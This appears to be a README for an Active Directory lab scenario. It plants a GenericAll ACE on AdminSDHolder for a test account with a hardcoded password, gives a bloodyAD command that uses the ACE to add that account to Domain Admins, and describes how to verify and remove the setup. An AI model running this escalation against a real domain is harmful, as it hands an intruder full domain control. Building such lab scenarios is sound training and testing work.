# acl-adminsdholder

Gives `scn-acl-sdh-attacker` (password `Aa1234567890!`) `GenericAll` on `CN=AdminSDHolder,CN=System`. SDProp copies the AdminSDHolder DACL to every protected object (Domain Admins, Administrator, ...); install triggers an SDProp run.

Attack:

    bloodyAD -d <domain> -u scn-acl-sdh-attacker -p 'Aa1234567890!' --host <dc ip> add groupMember 'Domain Admins' scn-acl-sdh-attacker

How to verify:

    dacledit.py -action read -principal scn-acl-sdh-attacker -target 'Domain Admins' <domain>/scn-acl-sdh-attacker:'Aa1234567890!' -dc-ip <dc ip>

Disable removes the ACE from AdminSDHolder, triggers SDProp (protected objects lose the ACE when it finishes, usually within a minute, at most at the next hourly run), and deletes the user. Not cleaned: group memberships the attacker added (remove them by hand).
